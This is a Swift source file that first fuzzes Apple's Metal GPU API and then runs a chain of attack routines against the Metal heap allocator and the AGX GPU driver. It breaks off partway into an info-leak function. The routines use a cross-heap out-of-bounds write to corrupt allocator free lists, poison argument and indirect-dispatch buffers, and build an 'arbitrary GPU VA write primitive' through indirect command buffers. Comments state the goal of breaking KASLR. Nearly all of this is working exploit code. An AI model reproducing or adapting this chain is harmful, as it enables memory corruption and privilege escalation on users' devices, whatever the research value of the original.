import Metal
import IOSurface
import Foundation

// Synchronous file logger — survives app crashes.
// Writes to Documents/metal_crash_log.txt before each operation.
// If the app crashes mid-fuzz, this file shows the last line executed.
class SyncLog {
    private let handle: FileHandle?
    static let logURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("metal_crash_log.txt")
    }()

    init() {
        FileManager.default.createFile(atPath: Self.logURL.path, contents: "=== Metal Fuzz Log ===\n".data(using: .utf8))
        handle = try? FileHandle(forWritingTo: Self.logURL)
        handle?.seekToEndOfFile()
    }

    func write(_ s: String) {
        guard let h = handle else { return }
        if let data = (s + "\n").data(using: .utf8) {
            h.write(data)
            h.synchronizeFile()   // flush to kernel immediately
        }
    }

    deinit { try? handle?.close() }

    static func read() -> String {
        (try? String(contentsOf: logURL, encoding: .utf8)) ?? "(no crash log found)"
    }
}

func runMetalFuzz(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()

        func step(_ s: String) {
            sl.write(s)
            log.append(s)
        }

        guard let device = MTLCreateSystemDefaultDevice(),
              let queue  = device.makeCommandQueue() else {
            step("✗ No Metal device"); completion(); return
        }
        step("Metal: \(device.name)")

        // ── 1. IOSurface alloc ───────────────────────────────────────────
        step("[1/6] IOSurface alloc")
        let surfCases: [(String, [IOSurfacePropertyKey: Any])] = [
            ("1x1",    [.width:1,   .height:1,   .bytesPerElement:4, .bytesPerRow:4,    .allocSize:4]),
            ("64x64",  [.width:64,  .height:64,  .bytesPerElement:4, .bytesPerRow:256,  .allocSize:16384]),
            ("256x256",[.width:256, .height:256, .bytesPerElement:4, .bytesPerRow:1024, .allocSize:262144]),
            ("13x7",   [.width:13,  .height:7,   .bytesPerElement:4, .bytesPerRow:52,   .allocSize:364]),
        ]
        for (label, props) in surfCases {
            autoreleasepool {
                step("  [surf] \(label) — allocating")
                guard let s = IOSurface(properties: props) else {
                    step("    nil"); return
                }
                step("    alloc OK — locking")
                var seed: UInt32 = 0xCAFEBABE
                let lk = s.lock(options: [], seed: &seed)
                step("    lock=\(lk) — unlocking")
                let uk = s.unlock(options: [], seed: &seed)
                step("    unlock=\(uk) seed=0x\(String(seed,radix:16))")
            }
        }

        // ── 2. Buffer page boundaries ────────────────────────────────────
        step("[2/6] Buffer boundaries")
        for sz in [0x3FFF, 0x4000, 0x4001, 0xFFFF, 0x100000] {
            autoreleasepool {
                step("  [buf] 0x\(String(sz,radix:16)) — makeBuffer")
                guard let buf = device.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    nil"); return
                }
                let actual = buf.length
                step("    actual=0x\(String(actual,radix:16)) — writing boundary bytes")
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                ptr[sz - 1] = 0xEE
                if actual > sz { ptr[actual - 1] = 0xFF }
                step("    done pad=\(actual-sz)")
            }
        }

        // ── 3. IOSurface-backed texture ──────────────────────────────────
        step("[3/6] IOSurface-backed textures")
        autoreleasepool {
            step("  [tex] matched 128x128 — surf alloc")
            guard let surf = IOSurface(properties: [
                .width:128,.height:128,.bytesPerElement:4,.bytesPerRow:512,.allocSize:65536
            ]) else { step("    surf nil"); return }
            step("  [tex] matched — makeTexture")
            let td = MTLTextureDescriptor.texture2DDescriptor(
                pixelFormat:.bgra8Unorm, width:128, height:128, mipmapped:false)
            td.storageMode = .shared
            let tex = device.makeTexture(descriptor: td, iosurface: surf, plane: 0)
            step("    tex=\(tex==nil ? "nil" : "OK")")
        }
        // MISMATCH test skipped in auto-flow — it calls abort() (SIGABRT), not catchable.
        // Use the dedicated "MISMATCH" button to run it deliberately.
        step("  [tex] MISMATCH skipped — use MISMATCH button (kills process via abort)")

        // ── 4. Blit encoder ──────────────────────────────────────────────
        step("[4/6] Blit encoder")
        autoreleasepool {
            step("  [blit] fill 4096 — makeCommandBuffer")
            guard let buf = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { step("  setup nil"); return }
            step("  [blit] fill — encoding")
            enc.fill(buffer: buf, range: 0..<4096, value: 0xAB)
            enc.endEncoding()
            step("  [blit] fill — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
            step("  fill result: \(ptr[0]==0xAB && ptr[4095]==0xAB ? "OK" : "MISMATCH")")
        }
        autoreleasepool {
            step("  [blit] copy — setup")
            guard let src = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let dst = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { return }
            src.contents().assumingMemoryBound(to: UInt8.self)[0] = 0x42
            step("  [blit] copy — encoding")
            enc.copy(from: src, sourceOffset: 0, to: dst, destinationOffset: 0, size: 4096)
            enc.endEncoding()
            step("  [blit] copy — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ok = dst.contents().assumingMemoryBound(to: UInt8.self)[0] == 0x42
            step("  copy status=\(cmd.status.rawValue) verify=\(ok)")
        }

        // ── 5. MTLHeap ───────────────────────────────────────────────────
        step("[5/6] MTLHeap")
        for sz in [4096, 0x10000] {
            autoreleasepool {
                step("  [heap] 0x\(String(sz,radix:16)) — makeHeap")
                let hd = MTLHeapDescriptor(); hd.size = sz; hd.storageMode = .shared
                guard let heap = device.makeHeap(descriptor: hd) else {
                    step("    nil"); return
                }
                step("  [heap] actual=\(heap.size) — suballoc x16")
                var bufs: [MTLBuffer] = []
                for _ in 0..<16 {
                    if let b = heap.makeBuffer(length: 256, options: .storageModeShared) { bufs.append(b) }
                }
                let n = bufs.count
                step("  [heap] sub=\(n) — releasing all")
                bufs.removeAll()
                step("  [heap] — realloc after free")
                let b2 = heap.makeBuffer(length: 128, options: .storageModeShared)
                step("    realloc=\(b2==nil ? "nil":"OK")")
            }
        }

        // ── 6. Rapid IOSurface ───────────────────────────────────────────
        step("[6/6] Rapid IOSurface 512x512 x30")
        var ok = 0; var fail = 0
        for i in 0..<30 {
            autoreleasepool {
                step("  [rapid] iter \(i)")
                guard let s = IOSurface(properties: [
                    .width:512,.height:512,.bytesPerElement:4,.bytesPerRow:2048,.allocSize:1048576
                ]) else { fail += 1; return }
                var seed: UInt32 = 0
                let _ = s.lock(options: [], seed: &seed)
                let _ = s.unlock(options: [], seed: &seed)
                ok += 1
            }
        }
        step("  created=\(ok) failed=\(fail)")
        step("── Metal fuzz complete ─────────────────────")
        completion()
    }
}

// Heap allocator confusion attack.
//
// Chain so far:
//   ✓ h0 OOB write → h1's memory (64/64 bytes confirmed)
//
// This step: corrupt h1's INTERNAL ALLOCATOR STATE before any h1 alloc,
// then call h1.makeBuffer() — if Metal's free list reads our planted bytes,
// the returned buffer's contents() lands at attacker-controlled address.
//
// Phase 1: alloc h0 (fills, establishes adjacency), leave h1 EMPTY
// Phase 2: snapshot h1's raw bytes via h0 OOB (read allocator metadata)
// Phase 3: log any pointer-class values in the snapshot (0x1xxxxxxxx pattern)
// Phase 4: plant a fake free-list entry pointing at h2's VA
// Phase 5: call h1.makeBuffer() — log the returned contents() pointer
// Phase 6: check if it left h1's normal range → arbitrary pointer confirmed
func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Allocator Confusion ─────────────────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared

        // Alloc h0 FULLY — establishes h0→h1 adjacency
        guard let h0 = device.makeHeap(descriptor: hd) else { step("h0 nil"); completion(); return }
        let actual = h0.size
        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        step("h0 va=0x\(String(va0,radix:16)) actual=\(actual)")

        // h1 — leave EMPTY (no suballoc yet — allocator state is pristine)
        // VA derived: spray confirmed heaps are contiguous at exactly actual_size spacing
        guard let h1 = device.makeHeap(descriptor: hd) else { step("h1 nil"); completion(); return }
        let va1_heap = va0 + UInt(actual)
        step("h1 va (derived)=0x\(String(va1_heap,radix:16))")

        // h2 — alloc fully — this is our target VA we want to redirect h1 into
        guard let h2 = device.makeHeap(descriptor: hd) else { step("h2 nil"); completion(); return }
        guard let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("b2 nil"); completion(); return }
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
        let va2 = UInt(bitPattern: p2)
        step("h2 va=0x\(String(va2,radix:16))")

        // Verify adjacency: h0 end == h1 start?
        let dist = va1_heap > va0 ? va1_heap - va0 : va0 - va1_heap
        step("dist h0→h1 = 0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("not adjacent this run — retry"); completion(); return }

        // Phase 2: snapshot h1's first 256 bytes via h0 OOB (before any h1 alloc)
        step("── Snapshot h1 allocator state (256 bytes) ──")
        var snapshot = [UInt8](repeating: 0, count: 256)
        for i in 0..<256 { snapshot[i] = p0[actual + i] }

        // Hex dump: 16 rows × 16 bytes
        for row in 0..<16 {
            let slice = snapshot[(row*16)..<(row*16+16)]
            let hex = slice.map { String(format:"%02x", $0) }.joined(separator:" ")
            step("  +\(String(format:"%03x", row*16)): \(hex)")
        }

        // Phase 3: scan for pointer-class values (8-byte aligned, 0x1xxxxxxxx range)
        step("── Pointer scan ──────────────────────────────")
        var foundPtrs = 0
        for off in stride(from: 0, to: 248, by: 8) {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(snapshot[off+b]) << (b*8) }
            if val > 0x100000000 && val < 0x200000000 {
                step("  +0x\(String(format:"%02x",off)): 0x\(String(val,radix:16)) ← PTR-CLASS")
                foundPtrs += 1
            }
        }
        step("  ptr-class values found: \(foundPtrs)")

        // Phase 4: plant fake free-list entry
        // CONFIRMED formula: returned = planted - actual (no dereference, direct subtraction).
        // Stage A was wrong — allocator doesn't dereference. Just plant va2+actual so returned=va2.
        let plantVal2 = va2 + UInt(actual)
        step("── Plant va2+actual=0x\(String(plantVal2,radix:16)) → expect returned=va2=0x\(String(va2,radix:16))")
        var plantVal = plantVal2
        for i in 0..<8 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8 }
        plantVal = plantVal2
        for i in 8..<32 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8; if i % 8 == 7 { plantVal = plantVal2 } }

        // Phase 5: trigger allocator — call makeBuffer on corrupted h1
        step("── h1.makeBuffer(256) with corrupted free-list")
        let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
        if let cb = confused {
            let cva = UInt(bitPattern: cb.contents())
            step("  returned va=0x\(String(cva,radix:16))")
            let normalRange = va1_heap...(va1_heap + UInt(actual))
            if normalRange.contains(cva) {
                step("  within h1 normal range — allocator robust against this overwrite")
            } else if cva >= va2 && cva < va2 + UInt(actual) {
                step("  *** IN h2 RANGE — ARBITRARY POINTER CONFIRMED ***")
                step("  *** makeBuffer returned h2's memory — full r/w primitive ***")
                step("  *** cva=0x\(String(cva,radix:16)) va2=0x\(String(va2,radix:16)) offset=\(cva - va2)")
            } else {
                let delta = cva > va2 ? cva - va2 : va2 - cva
                step("  OUTSIDE — cva=0x\(String(cva,radix:16)) delta_from_va2=\(Int(bitPattern: cva) - Int(bitPattern: va2))")
                step("  partial primitive — allocator read our plant but arithmetic still off by 0x\(String(delta,radix:16))")
            }
        } else {
            step("  nil — heap corrupted/exhausted")
        }

        step("── Allocator Confusion complete ────────────")
        completion()
    }
}

// Argument buffer corruption via OOB heap write.
// Alloc h0+h1 adjacent. Create an argument buffer in h1 encoding a live texture.
// Corrupt the argument buffer's encoded handle via h0 OOB write.
// Submit a GPU compute pass reading from the corrupted argument buffer.
// If AGX dereferences the corrupted handle → GPU fault → AGX kernel path hit.
func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── ArgBuffer Corruption ──────────────────")

        // Use SAME approach as confirmed boundary cross:
        // alloc h0+h1+h2 sequentially, check adjacency, write via p0 OOB into h1.
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        // Fill h0 fully → establishes OOB boundary at h1
        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        // Fill h1 with victim buffer (this is what we'll corrupt then submit to GPU)
        guard let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("b1 nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")

        guard dist == UInt(actual) else {
            step("✗ not adjacent (dist=0x\(String(dist,radix:16))) — retry"); completion(); return
        }
        step("✓ adjacent — OOB write path confirmed")

        // Fill h1 with sentinel, verify OOB read from h0 hits it
        for i in 0..<actual { p1[i] = 0xAA }
        let probe = p0[actual]
        step("probe p0[\(actual)] = 0x\(String(probe,radix:16))")
        guard probe == 0xAA else { step("✗ sentinel not reached — layout shifted"); completion(); return }
        step("✓ cross-heap read confirmed")

        // Write 64 bytes of poison into h1[0..63] via h0 OOB
        // 0xDEADBEEFCAFEBABE pattern — will be in the buffer AGX reads during GPU command processing
        let poison: [UInt8] = [0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE]
        step("── Writing 64 bytes of poison into h1[0..63] via h0 OOB ──")
        for i in 0..<64 { p0[actual + i] = poison[i] }

        // Verify via p1 (direct)
        var hits = 0
        for i in 0..<64 { if p1[i] == poison[i % 8] { hits += 1 } }
        step("  verify via p1: \(hits)/64 bytes confirmed")
        guard hits > 0 else { step("✗ poison didn't land in h1"); completion(); return }
        step("✓ h1 buffer is now poisoned with attacker data")

        // Submit GPU blit command using the POISONED h1 buffer.
        // AGX kernel driver reads b1's contents when scheduling the GPU command.
        // If AGX dereferences our poison as a resource handle → GPU fault → kernel path.
        step("── Submitting GPU blit on poisoned h1 buffer ──")
        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
        guard let blit = cmdBuf.makeBlitCommandEncoder() else { step("blit nil"); completion(); return }

        // Fill blit: copy h1[0..7] → h1[8..15]. AGX must read h1's descriptor during scheduling.
        blit.copy(from: b1, sourceOffset: 0, to: b1, destinationOffset: 8, size: 8)
        blit.endEncoding()

        cmdBuf.addCompletedHandler { cb in
            let status = cb.status
            let err    = cb.error?.localizedDescription ?? "none"
            switch status {
            case .completed:
                step("  cmdBuf COMPLETED — AGX processed poisoned buffer without fault")
                step("  AGX validates buffer VA, not contents — contents corruption is GPU-data-plane only")
                // Verify: did AGX actually copy our poison bytes?
                var after = [UInt8](repeating: 0, count: 8)
                for i in 0..<8 { after[i] = p1[8 + i] }
                let afterHex = after.map { String(format: "%02x", $0) }.joined(separator: " ")
                step("  h1[8..15] after blit: \(afterHex)")
                if after == Array(poison[0..<8]) {
                    step("  *** POISON PROPAGATED: AGX copied 0xDEADBEEF bytes in GPU command ***")
                    step("  *** If b1 were used as indirect cmd buffer / arg buffer, this corrupts GPU state ***")
                }
            case .error:
                step("  *** cmdBuf ERROR — AGX faulted on poisoned buffer")
                step("  *** error: \(err)")
                step("  *** AGX KERNEL PATH HIT — driver read our OOB-written bytes")
            default:
                step("  cmdBuf status=\(status.rawValue) err=\(err)")
            }
            step("── ArgBuffer Corruption complete ────────────")
            completion()
        }

        step("  commit…")
        cmdBuf.commit()
    }
}

// Indirect dispatch corruption.
// Write 0xDEADBEEF into h1 via OOB, then use h1 as an indirect dispatch buffer.
// AGX kernel scheduler reads the buffer to get thread grid dimensions before GPU launch.
// Poison bytes (3.7B thread groups) → either AGX driver integer overflow or GPU hang/watchdog.
func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── GPU Indirect Dispatch Corruption ─────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let dist = va1 > va0 ? va1 - va0 : va0 - va1

        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
        step("✓ adjacent")

        // Verify cross-heap read
        for i in 0..<actual { p1[i] = 0xAA }
        guard p0[actual] == 0xAA else { step("✗ sentinel miss"); completion(); return }
        step("✓ cross-heap read confirmed")

        // MTLDispatchThreadgroupsIndirectArguments layout:
        // uint32 threadgroupsX, uint32 threadgroupsY, uint32 threadgroupsZ  (12 bytes total)
        // Write 0xDEADBEEF into all three fields via h0 OOB
        let poisonU32: UInt32 = 0xDEADBEEF
        step("── Writing indirect dispatch args via h0 OOB ──")
        step("  poisoning threadgroupsX/Y/Z = 0x\(String(poisonU32,radix:16)) each")
        // Write 3 × UInt32 little-endian into h1[0..11]
        for field in 0..<3 {
            var v = poisonU32
            for b in 0..<4 {
                p0[actual + field*4 + b] = UInt8(v & 0xFF)
                v >>= 8
            }
        }
        // Verify
        var readback: UInt32 = 0
        for b in 0..<4 { readback |= UInt32(p1[b]) << (b*8) }
        step("  h1[0..3] readback = 0x\(String(readback,radix:16)) (expect 0xdeadbeef)")

        // Build a trivial Metal compute pipeline (empty kernel)
        // Must have a real compiled function — use a precompiled library approach:
        // simplest: device.makeDefaultLibrary() looks for default.metallib in the bundle.
        // If not present, use makeComputePipelineState with a dynamic-compiled function.
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void noop(uint id [[thread_position_in_grid]]) {}
        """
        step("── Compiling noop compute shader ──")
        let lib: MTLLibrary
        let fn:  MTLFunction
        let pso: MTLComputePipelineState
        do {
            let opts = MTLCompileOptions()
            lib = try device.makeLibrary(source: src, options: opts)
            guard let f = lib.makeFunction(name: "noop") else { step("fn nil"); completion(); return }
            fn  = f
            pso = try device.makeComputePipelineState(function: fn)
        } catch {
            step("✗ shader compile failed: \(error.localizedDescription)"); completion(); return
        }
        step("  shader compiled OK")

        // Encode indirect dispatch using b1 as the indirect args buffer (contains our poison)
        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
        guard let enc = cmdBuf.makeComputeCommandEncoder() else { step("enc nil"); completion(); return }
        enc.setComputePipelineState(pso)
        // dispatchThreadgroups(indirectBuffer:) — AGX kernel reads b1[0..11] as grid size
        enc.dispatchThreadgroups(indirectBuffer: b1,
                                  indirectBufferOffset: 0,
                                  threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
        enc.endEncoding()

        cmdBuf.addCompletedHandler { cb in
            let status = cb.status
            let err    = cb.error?.localizedDescription ?? "none"
            switch status {
            case .completed:
                step("  cmdBuf COMPLETED — AGX accepted 0xDEADBEEF thread groups without fault")
                step("  AGX either clamped or dispatched the value (GPU firmware handled it)")
            case .error:
                step("  *** cmdBuf ERROR — AGX faulted on 0xDEADBEEF indirect dispatch")
                step("  *** error: \(err)")
                step("  *** AGX KERNEL/FIRMWARE PATH HIT — scheduler read our OOB bytes as grid dimensions")
            default:
                step("  status=\(status.rawValue) err=\(err)")
            }
            step("── Indirect Dispatch Corruption complete ─────")
            completion()
        }

        step("  commit (dispatching 0x\(String(poisonU32,radix:16))^3 thread groups)…")
        sl.write("LAST STEP BEFORE GPU SUBMIT — if crash here, AGX scheduler faulted")
        cmdBuf.commit()
    }
}

// ICB Controlled Write — full arbitrary GPU VA write primitive via ICB execute path.
// OOB from h0 corrupts icbBuf[0] (in h1 adjacent heap) with a computed idx such that
// dataBuf_base + idx*8 == targetBuf_base. GPU shader writes idx to that address.
// CPU reads targetBuf[0] post-execute to confirm controlled write landed.
// Both buffers are 256-aligned (Metal guarantee) so (target - data) is divisible by 8.
func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); completion(); return }
        step("── ICB Controlled Write ──────────────────────")

        // h0 (OOB src) + h1 (victim — icbBuf lives here)
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)

        // probe1 at h1[0..4095]; icbBuf at h1[4096] — OOB-reachable from h0
        guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
        let va1 = UInt(bitPattern: probe1.contents())
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
        step("✓ adjacent confirmed")

        // icbBuf: ICB's bound index buffer — sits in h1, writable via h0 OOB
        guard let icbBuf = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("icbBuf nil"); completion(); return }

        // h2: shared heap backing both dataBuf and targetBuf.
        // If AGX bounds-checks shader buffer accesses against heap size (not suballocation size),
        // dataBuf[512] = h2[4096] = targetBuf[0] → intra-heap GPU OOB write primitive.
        // If AGX uses suballocation bounds, the write will be silently dropped (previous result).
        let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared
        guard let h2 = device.makeHeap(descriptor: hd2) else { step("h2 nil"); completion(); return }
        // dataBuf at h2[0..4095] (suballoc of exactly dataBuf's 4096 bytes)
        guard let dataBuf   = h2.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil");   completion(); return }
        // targetBuf at h2[4096..4351] — sits immediately after dataBuf in h2's physical memory
        guard let targetBuf = h2.makeBuffer(length: 256,  options: .storageModeShared) else { step("targetBuf nil"); completion(); return }

        let dataBufBase   = UInt(bitPattern: dataBuf.contents())
        let targetBufBase = UInt(bitPattern: targetBuf.contents())

        // idx: dataBuf_base + idx*8 = targetBuf_base → idx = (target - data) / 8
        // Both 256-aligned suballocs from h2 → diff divisible by 8
        let idx = (targetBufBase &- dataBufBase) / 8

        // Sentinel so we detect if GPU write landed at targetBuf[0]
        let pTarget = targetBuf.contents().assumingMemoryBound(to: UInt64.self)
        pTarget[0]  = 0xDEADBEEFCAFEBABE

        step("h2 size=0x\(String(h2.size,radix:16)) (heap backs both bufs)")
        step("dataBuf_base  = 0x\(String(dataBufBase,   radix:16))")
        step("targetBuf_base= 0x\(String(targetBufBase, radix:16))")
        step("idx            = 0x\(String(idx,           radix:16)) (dataBuf suballoc has \(dataBuf.length/8) uint64s)")
        step("targetBuf[0] sentinel = 0xDEADBEEFCAFEBABE")

        // Shader: reads icbBuf[0] as idx, writes dataBuf[idx] = idx
        // → with our idx: GPU writes idx (UInt64) to targetBuf_base
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void icbFuzz(device ulong* indexBuf [[buffer(0)]],
                            device ulong* dataBuf  [[buffer(1)]],
                            uint id [[thread_position_in_grid]]) {
            ulong idx = indexBuf[0];
            dataBuf[idx] = idx;
        }
        """
        let lib: MTLLibrary; let pso: MTLComputePipelineState
        do {
            lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
            guard let fn = lib.makeFunction(name: "icbFuzz") else { step("fn nil"); completion(); return }
            let psoDesc = MTLComputePipelineDescriptor()
            psoDesc.computeFunction = fn
            psoDesc.supportIndirectCommandBuffers = true
            pso = try device.makeComputePipelineState(descriptor: psoDesc, options: [], reflection: nil)
        } catch { step("✗ PSO: \(error.localizedDescription)"); completion(); return }
        step("icbFuzz PSO compiled (ICB-capable)")

        // ICB from device (MTLHeap.makeIndirectCommandBuffer unsupported)
        let icbDesc = MTLIndirectCommandBufferDescriptor()
        icbDesc.commandTypes = .concurrentDispatch
        icbDesc.inheritBuffers = false
        icbDesc.inheritPipelineState = false
        icbDesc.maxKernelBufferBindCount = 2
        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
                                                          maxCommandCount: 1,
                                                          options: .storageModeShared) else {
            step("✗ ICB nil"); completion(); return
        }
        step("ICB allocated (storageModeShared)")

        // Encode 1 compute command into ICB
        let cmd0 = icb.indirectComputeCommandAt(0)
        cmd0.setComputePipelineState(pso)
        cmd0.setKernelBuffer(icbBuf,  offset: 0, at: 0)
        cmd0.setKernelBuffer(dataBuf, offset: 0, at: 1)
        cmd0.concurrentDispatchThreads(MTLSize(width:1,height:1,depth:1),
                                        threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
        step("ICB encoded: icbFuzz(icbBuf[h1], dataBuf) dispatch(1,1,1)")

        // OOB-corrupt icbBuf[0..7] via h0 with computed idx (little-endian, ARM64)
        // p0[actual + 4096 + b] writes into icbBuf[b]
        step("OOB-writing idx into icbBuf[0] via h0")
        for b in 0..<8 { p0[actual + 4096 + b] = UInt8((idx >> (b * 8)) & 0xFF) }

        // Readback to confirm OOB write landed
        var rb: UInt64 = 0
        for b in 0..<8 { rb |= UInt64(p0[actual + 4096 + b]) << (b*8) }
        let rbMatch = rb == UInt64(idx)
        step("icbBuf[0] readback: 0x\(String(rb,radix:16)) \(rbMatch ? "✓" : "✗ mismatch")")

        // Execute ICB via outer compute encoder
        guard let cmd = queue.makeCommandBuffer(),
              let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
        enc.setComputePipelineState(pso)
        enc.useResource(icb,       usage: .read)
        enc.useResource(icbBuf,    usage: .read)
        enc.useResource(dataBuf,   usage: .write)
        enc.useResource(targetBuf, usage: .write)
        enc.executeCommandsInBuffer(icb, range: 0..<1)
        enc.endEncoding()
        sl.write("CONTROLLED WRITE — committing ICB execute")
        cmd.addCompletedHandler { [pTarget, targetBuf] cb in
            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
            switch s {
            case .completed:
                let written = pTarget[0]
                if written == UInt64(idx) {
                    step("  *** CONTROLLED WRITE CONFIRMED ***")
                    step("  targetBuf[0] = 0x\(String(written,radix:16)) == idx ✓")
                    step("  GPU wrote to exact target VA via ICB execute — full arbitrary write primitive")
                } else if written == 0xDEADBEEFCAFEBABE {
                    step("  COMPLETED — sentinel intact, GPU write landed elsewhere")
                    step("  targetBuf[0] = 0xDEADBEEFCAFEBABE (unchanged)")
                } else {
                    step("  COMPLETED — targetBuf[0]=0x\(String(written,radix:16)) (partial/unexpected)")
                }
            case .error:
                step("  ERROR — kernel blocked GPU write")
                step("  error: \(e)")
            default:
                step("  status=\(s.rawValue) err=\(e)")
            }
            step("── ICB Controlled Write complete ──────────")
            completion()
        }
        cmd.commit()
    }
}

// OOB Info Leak — cross-heap OOB READ to scan h1's GPU-visible shared memory for
// kernel/firmware pointers written by AGX firmware during command execution.
// Texture at h1[4096] + a completed compute pass causes the firmware to write
// command-tracking metadata into h1's shared region. We then OOB-read the entire
// h1 window looking for pointer-shaped values that break KASLR or reveal GPU VA layout.
func runOOBInfoLeak(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
